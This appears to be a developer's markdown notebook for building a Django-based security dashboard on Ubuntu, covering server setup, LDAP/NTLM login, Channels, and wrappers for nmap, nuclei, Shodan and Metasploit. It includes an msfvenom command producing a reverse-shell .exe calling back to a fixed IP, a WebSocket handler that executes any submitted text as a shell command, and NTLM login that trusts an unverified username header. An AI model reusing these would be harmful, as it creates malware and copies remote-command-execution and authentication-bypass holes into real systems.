# Install Ubuntu
1. Download Ubuntu Server
   - https://ubuntu.com/download/server
2. Network
   - ens32  =>  Edit IPv4  =>  `Disabled`
3. Storage
   - `Custom storage layout`
   - free space  =>  Add GPT Partition  =>  `1G` , `ext4` , `/boot`
   - free space  =>  Add GPT Partition  => `10G` , `swap`
   - free space  =>  Add GPT Partition  => `188.997G` , `Leave unformatted`
   - Create volume group  =>  [x] partition 4
   - free space  =>  Create Logical Volume  =>  `lv-root` , `188.996G` , `/`

   
# Remote Development with VSCode
- Activate ssh with root
```bash
nano /etc/ssh/sshd_config
   PermitRootLogin yes
service ssh restart
```

```bash
passwd root
```
- Install `Remote Development` in Visual Studio Code
- `Ctrl` + `Shift` + `P`  =>  `root@192.168.100.100`  =>  `Linux`  =>  [password]
  - Many retries are needed"
- Select app directory

# Datta-Able
- Resources
  - https://appseed.us/product/datta-able/django/
  - https://github.com/app-generator/django-datta-able

- Setup
```bash
git clone https://github.com/app-generator/django-datta-able.git
cd django-datta-able
virtualenv env
.\env\Scripts\activate         # windows
source env/bin/activate        # linux
pip3 install -r requirements.txt
python manage.py makemigrations
python manage.py migrate
python manage.py createsuperuser
python manage.py runserver
```

- https://github.com/biggie9925/django-crud-yoobee/blob/main/tasks/templates/tasks/task_detail.html
- https://github.com/rayed/django_crud/tree/master/apps/books_fbv/templates/books_fbv
- https://github.com/shiyunbo/django-crud-example

# Time Setting
- Set TimeZone
```bash
timedatectl set-timezone Asia/Tehran
```

- Add `NTP=[ntp-server-address]` in `nano /etc/systemd/timesyncd.conf`

- Restart the service
```bash
systemctl restart systemd-timesyncd.service
```

- Check the clock
```bash
timedatectl
```

- Chnage this line in `settings.py`
```bash
TIME_ZONE = 'Asia/Tehran'
```

# Title bar icon
- Download svg icon with white color (`#fff`) from https://icon-sets.iconify.design/feather/grid/

- Open svg file and change for background color (`width`, `height`, `fill`)
```bash
<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="#1de9b6" stroke="white" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M23 12a11.05 11.05 0 0 0-22 0zm-5 7a3 3 0 0 1-6 0v-7"/></svg>
```

- Convert SVG to PNG in https://realfavicongenerator.net/ (and change the background color, it will download ico file too)
- NOT NEEDE: Convert PNG to ICO in https://convertico.com/

- 
# Auto Running
- Create service
```bash
nano /etc/systemd/system/ServiceName.service
```

```bash
[Unit]
Description=ServiceName
After=network.target

[Service]
User=root
Group=www-data
WorkingDirectory=/opt/ServiceName
Environment="PATH=/opt/ServiceName/env/bin"
ExecStart=/opt/ServiceName/env/bin/gunicorn --config /opt/ServiceName/gunicorn-cfg.py core.wsgi

Restart=always

[Install]
WantedBy=multi-user.target
```

```bash
systemctl daemon-reload
systemctl enable ServiceName
systemctl start ServiceName
```

# RTL
- Upload ```static/assets/css/style.css``` in https://rtlcss.com/playground/ and update the file with new RTL style.

- Add ```direction: rtl``` to the body element of ```style.css``` file.
```bash
body {
  direction: rtl;
  text-align: right;
...
```

- Change css to stick the logo to top-right
![601](./res/601.jpg)
```bash
.pcoded-navbar .header-logo {
...
  margin-left: 0;     =>      margin-right: 0;
...
}
```

- Change ```templates/layouts/base.html``` & ```base-auth.html```

```bash
<!DOCTYPE html>
<html lang="fa" dir="rtl">
```

# Font
- Add Vazir Font in ```style.css```
```bash
...
@font-face {
  font-family: "Vazir";
  src: url("../fonts/vazir/Vazir.ttf");
}

body {
  direction: rtl;
  text-align: right;
  font-family: "Vazir", "Open Sans", sans-serif;
...
```

# Postgres Backup
```bash
pg_dump -U root -F c postgres > 14020925.dump
pg_restore -U root -d postgres 14020925.dump
```

# Publish Web app in network
- Edit settings.py
```bash
ALLOWED_HOSTS = ['localhost', '127.0.0.1', '192.168.100.100']
```

- Run
```bash
python manage.py runserver 0.0.0.0:8000
```


# LDAP Authentication
- Resource  =>  https://coderbook.com/@marcus/how-to-add-ldap-and-active-directory-authentication-to-django/
```bash
apt-get install libldap2-dev  
apt-get install libsasl2-dev  
pip install django-auth-ldap
```
- `settings.py`
  - Find `dn` value with `ADExplorer64.exe` from `SysinternalsSuite`.

```bash
import ldap
from django_auth_ldap.config import LDAPSearch

AUTHENTICATION_BACKENDS = [
    'django_auth_ldap.backend.LDAPBackend',
    'django.contrib.auth.backends.ModelBackend',
]
AUTH_LDAP_SERVER_URI = 'ldap://xxx.net'
AUTH_LDAP_ALWAYS_UPDATE_USER = True
AUTH_LDAP_BIND_DN = 'CN=e_ebadi,CN=Users,DC=iranet,DC=net'
AUTH_LDAP_BIND_PASSWORD = 'xxxxxxxxx'
AUTH_LDAP_USER_SEARCH = LDAPSearch(
    "CN=Users,DC=xxx,DC=net", ldap.SCOPE_SUBTREE, "(sAMAccountName=%(user)s)"
)
AUTH_LDAP_USER_ATTR_MAP = {
    "username": "sAMAccountName",
    "first_name": "company",             # givenName
    "last_name": "description",          # sn
    "email": "postOfficeBox",            # mail
}
```


# NTLM Authentication
- Install `impacket` library.
```bash
pip install impacket
```

- Should pass all headers:
```bash
/opt/SAMAD/env/bin/gunicorn --config /opt/SAMAD/gunicorn-cfg.py --timeout 120 --forwarded-allow-ips="*" core.wsgi
```

- Extract username from NTLM header `HTTP_Authorization`
```bash
from axes.models import AccessLog, AccessAttempt
from django.shortcuts import render, redirect
from django.contrib.auth import login, logout
from django.contrib.auth.decorators import login_required
from django.contrib.auth.models import User
from impacket.ntlm import NTLMAuthChallengeResponse
from base64 import b64decode
import ldap
from django_auth_ldap.config import LDAPSearch

def user_login(request):
    # Get username from NTLM header
    ntlm_header = request.META.get("HTTP_AUTHORIZATION")
    if ntlm_header and ntlm_header.startswith("NTLM "):
        decoded_ntlm_message = b64decode(ntlm_header[5:])
        challenge = NTLMAuthChallengeResponse()
        challenge.fromString(decoded_ntlm_message)
        username = challenge['user_name'].decode('utf-16-le')

        # Fetch user from DB    
        user = User.objects.get(username__iexact=username)
        if user is not None:
            # Update user information from LDAP to DB 
            user_info = get_ldap_user_info(username)
            user.first_name = user_info['first_name']
            user.last_name = user_info['last_name']
            user.email = user_info['email']
            user.save()

            # Login user if it exists in any group
            groups = user.groups.all()
            if groups:
                user.backend = 'django.contrib.auth.backends.ModelBackend'
                login(request, user)
                return redirect('/')
            else:
                return render(request, 'accounts/auth-signin.html', status=401)
    else:
        return render(request, 'accounts/auth-signin.html', status=401)
```

# Cockpit
- Installation
```bash
apt install cockpit
systemctl start cockpit        # Access to web from https://<server-ip>:9090
```

- Add these lines to `/usr/lib/systemd/system/cockpit.service`
```bash
[Install]
WantedBy=multi-user.target
Alias=cockpit.socket
```

- Enable the service
```bash
systemctl daemon-reload
systemctl enable cockpit
```

# Free RAM
```bash
systemctl disable apt-daily.timer
```

# Django Channels
- Dependencies
```bash
pip install channels gunicorn uvicorn
```

- `core` > `settings.py`
```python
INSTALLED_APPS = [
    ...
    'channels',
]

ASGI_APPLICATION = 'core.asgi.application'
CHANNEL_LAYERS = {
    'default': {
        'BACKEND': 'channels.layers.InMemoryChannelLayer',  # or use 'channels.layers.RedisChannelLayer'
    },
}
```

- `core` > `asgi.py`
```python
import os
from django.core.asgi import get_asgi_application
from channels.routing import ProtocolTypeRouter, URLRouter
from channels.auth import AuthMiddlewareStack
from apps.network.routing import websocket_urlpatterns

os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'core.settings')

application = ProtocolTypeRouter({
    'http': get_asgi_application(),
    'websocket': AuthMiddlewareStack(
        URLRouter(
            websocket_urlpatterns
        )
    ),
})
```

- `apps` > `network` > `consumers.py`
```python
import subprocess
from channels.generic.websocket import AsyncWebsocketConsumer

class CommandConsumer(AsyncWebsocketConsumer):
    async def connect(self):
        await self.accept()

    async def receive(self, text_data=None, bytes_data=None):
        command = text_data
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()

        if error:
          await self.send(text_data=f"Error: {error.decode('utf-8')}")
        else:
          await self.send(text_data=output.decode('utf-8'))

    async def disconnect(self, close_code):
        pass
```

```python
class NetNameReverseLookupConsumer(AsyncWebsocketConsumer):
    async def connect(self):
        await self.accept()

    async def receive(self, text_data=None, bytes_data=None):
        ip_list = []
        for ip in ipaddress.IPv4Network(text_data):
            ip_list.append(str(ip))

        with ThreadPoolExecutor() as executor:
            results = executor.map(self.process_ip, ip_list)
            for result in results:
                await self.send(text_data=result)

    def process_ip(self, ip):
        cmd = ["docker", "run", "--rm", "zeitgeist/docker-whois", ip]
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        if output:
            match = re.search(r"(?i)netname:\s+(.*)", output.decode("utf-8"))
            return f"{ip} > {match.group(1)}\n"
        return ""          

    async def disconnect(self, close_code):
        pass
```

- `apps` > `network` > `routing.py`
```python
from django.urls import re_path
from . import consumers

websocket_urlpatterns = [
    re_path(r'ws/command/$', consumers.CommandConsumer.as_asgi()),
]
```

- `apps` > `templates` > `network` > `scanner.html`
```html
<h1>Command Execution</h1>
<input type="text" id="command" placeholder="Enter command">
<button onclick="sendCommand()">Execute</button>
<div id="output"></div>

<script>
  var socket = new WebSocket('ws://' + window.location.host + '/ws/command/');

  socket.onmessage = function(event) {
      var output = document.getElementById('output');
      output.innerHTML += event.data + '<br>';
  };

  function sendCommand() {
      var input = document.getElementById('command');
      socket.send(input.value);
      input.value = '';
  }
</script>
```

- Nginx
```bash
location /ws/ {
    proxy_pass http://webapp;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection "Upgrade";
}
```

- Run
```bash
gunicorn core.asgi:application -w 1 -k uvicorn.workers.UvicornWorker --bind 0.0.0.0:5005
```


# Nmap
- Create a Dockerfile in ```dockers``` > ```nmap```
```bash
FROM alpine:latest

RUN apk update && \
    apk add nmap && \
    apk add nmap-scripts
```

- Create docker image by running this command in ```dockers``` > ```nmap```
```bash
docker build -t nmap .
```

- `consumers.py`
```python
import subprocess
from channels.generic.websocket import AsyncWebsocketConsumer
import subprocess

class CommandConsumer(AsyncWebsocketConsumer):
    async def connect(self):
        await self.accept()

    async def receive(self, text_data=None, bytes_data=None):
        target = text_data
        # cmd = ['docker', 'run', '--rm', '-it', 'nmap', 'nmap', '-sV', '-p', '443', '--script=banner', target]
        cmd = ['docker', 'run', '--rm', '-it', 'nmap', 'nmap', '-p', '443', target]
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        print (error.decode('utf-8'))
        await self.send(text_data=(
            output.decode('utf-8') +
            '<br>-----------------------------------<br>' +
            'ERROR<br>-----------------------------------<br>' +
            error.decode('utf-8')
        ))

    async def disconnect(self, close_code):
        pass
```

# Shodan API
- Install library
```bash
pip install shodan
```

- `views.py`
```python
def shodan(request):
    api = Shodan('xxxxxxxxxxxxxxxx')
    ipinfo = api.host('8.8.8.8')

    context = {
        'ipinfo': ipinfo,
    }
    return render(request, "api/shodan.html", context)
```

# Nuclei Docker
- Pull image
```bash
docker pull projectdiscovery/nuclei
```

- Download template from https://github.com/projectdiscovery/nuclei-templates and put them in `/root/nuclei-templates`

- Get list of templates and put them into `/opt/ZORBA/apps/static/nuclei-templates.txt`
```bash
docker run --rm -it projectdiscovery/nuclei -tl
```

- Run
```bash
docker run -it -v ~/nuclei-templates:/templates projectdiscovery/nuclei -t /templates -u https://scanme.nmap.org
```

# Metasploit RPC
- Get docker image
```bash
docker pull metasploitframework/metasploit-framework
```

- Run Docker and enable RPC on port 4444
```bash
docker run -it --rm -p 4444:4444 -p 55553:55553 metasploitframework/metasploit-framework /bin/bash -c "./msfconsole -q -x 'load msgrpc ServerHost=0.0.0.0 ServerPort=55553 User=msf Pass=abc123'"
```

- Manual commands  (No Need !)
```bash
# Run Exploit in one line with Docker
docker run -it --rm -p 4444:4444 metasploitframework/metasploit-framework /bin/bash -c "./msfconsole -qx 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 191.167.1.240; set LPORT 4444; exploit'"

# Create maliciuos .exe with msfvenom
docker run --rm -it -v /opt/payload:/home/msf metasploitframework/metasploit-framework /bin/bash
bash-5.1$ ./msfvenom -p windows/meterpreter/reverse_tcp LHOST=191.167.1.240 LPORT=4444 -f exe -o /home/msf/reverse_shell.exe
```

# Login attempt
- Install package
```bash
pip install django-axes
```

- `settings.py`
```python
INSTALLED_APPS = [
    **
    'axes',
]

MIDDLEWARE = [
    **
    'axes.middleware.AxesMiddleware',
]

AUTHENTICATION_BACKENDS = [
    'django.contrib.auth.backends.ModelBackend',
    'axes.backends.AxesStandaloneBackend',
]

AXES_ENABLE_SUCCESS = True
AXES_ENABLE_REGISTRATION = False
AXES_LOCK_OUT_AT_FAILURE = True
AXES_COOLOFF_TIME = 1
AXES_FAILURE_LIMIT = 10
```

- Migrate
```bash
python manage.py migrate
```

- `apps` > `authentication` > `urls.py`
```python
from .views import login_attempts

urlpatterns = [
    *
    path('login-attempts/', login_attempts, name='login_attempts'),
]
```

- `apps` > `authentication` > `views.py`
```python
from django.contrib.auth.models import User
from axes.models import AccessLog, AccessAttempt
from django.shortcuts import render

def login_view(request):
    *
            user = authenticate(request=request, username=username, password=password)   # add request=request to arguments
    *

def login_attempts(request):
    access_logs = AccessLog.objects.filter(username__isnull=False).order_by('-attempt_time')[:10]
    failed_attempts = AccessAttempt.objects.filter(attempt_time__isnull=False, failures_since_start__gt=0).order_by('-attempt_time')[:10]
    login_attempts = []
    for log in access_logs:
        user = User.objects.get(username=log.username)
        login_attempts.append({
            'username': log.username,
            'time': log.attempt_time,
            'date': log.attempt_time.date(),
            'user_fullname': user.get_full_name(),
            'success': True,
        })
    for attempt in failed_attempts:
        login_attempts.append({
            'username': attempt.username,
            'time': attempt.attempt_time,
            'date': attempt.attempt_time.date(),
            'user_fullname': '',
            'success': False,
        })
    login_attempts = sorted(login_attempts, key=lambda x: x['time'], reverse=True)[:10]
    return render(request, 'accounts/login_attempts.html', {'login_attempts': login_attempts})
```

- `apps` > `templates` > `accounts` > `login_attempts.html`
```html
<div class="body flex-grow-1 px-3">
  <div class="container-lg">
    <div class="card mb-4">
      <h6 class="card-header">Last 20 Login Attempts</h6>
      <div class="card-body">
        <table class="table table-striped">
          <thead>
            <tr>
              <th>Username</th>
              <th>Time</th>
              <th>Date</th>
              <th>Status</th>
            </tr>
          </thead>
          <tbody>
            {% for attempt in login_attempts %}
                <tr>
                    <td>{{ attempt.username }}</td>
                    <td>{{ attempt.time }}</td>
                    <td>{{ attempt.date }}</td>
                    <td class="{% if attempt.success %}text-success{% else %}text-danger{% endif %}">
                      {% if attempt.success %}
                          <span class="badge me-1 rounded-pill bg-success">Success</span>
                      {% else %}
                          <span class="badge me-1 rounded-pill bg-danger">Failure</span>
                      {% endif %}
                    </td>
                </tr>
            {% endfor %}
          </tbody>
        </table>
      </div>
    </div>
  </div>
</div>
```

# Show Github md files in Methodology
- Get Token with `Read Content` permission and Access to Class Repository from https://github.com/settings/tokens?type=beta

- Install packages
```bash
pip install markdown2
```
  
- `views.py`
```python
import requests
import base64
import markdown2

def xss(request):
    access_token = 'github_pat_11APOZ4FA0V8xxxxxxxxxxxxxxxxxxxxxxx'

    owner = 'target-hunter'
    repo = 'Class'
    path = 'OWASP/01-Network.md'

    url = f'https://api.github.com/repos/{owner}/{repo}/contents/{path}'
    headers = {'Authorization': f'token {access_token}'}
    response = requests.get(url, headers=headers)

    content = response.json()['content']
    decoded_content = base64.b64decode(content).decode('utf-8')
  
    html_content = markdown2.markdown(decoded_content)
    context = {
        'html_content': html_content,
    }
    return render(request, "owasp/xss.html", context) 
```

# Selenium
- Get and run docker image
```bash
docker pull selenium/standalone-chrome
docker run -d -p 4444:4444 --shm-size="2g" selenium/standalone-chrome
```

- Install library
```bash
pip uninstall selenium
```

- Python code
```python
from selenium import webdriver

options = webdriver.ChromeOptions()
options.add_argument('--headless')

driver = webdriver.Remote(
    command_executor='http://localhost:4444',
    options=options
)

driver.get('https://www.google.com')
driver.save_screenshot('screenshot.png')

driver.quit()
```

# Gunicorn timeout
```bash
gunicorn core.asgi:application --timeout 200 -w 1 -k uvicorn.workers.UvicornWorker --bind 0.0.0.0:5005
```

# Fetch from Github
```python
from django.shortcuts import render, redirect
from django.urls import reverse
import re
import requests
import base64
import mistune

def sqli(request):
    access_token = 'github_pat_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'

    owner = 'xxx'
    repo = 'checklist'
    path = 'sqli.md'

    url = f'https://api.github.com/repos/{owner}/{repo}/contents/{path}'
    headers = {'Authorization': f'token {access_token}'}
    response = requests.get(url, headers=headers)

    content = response.json()['content']
    decoded_content = base64.b64decode(content).decode('utf-8')
  
    html_content = mistune.markdown(decoded_content)
    context = {
        'html_content': html_content,
    }
    return render(request, "checklist/sqli.html", context)
```
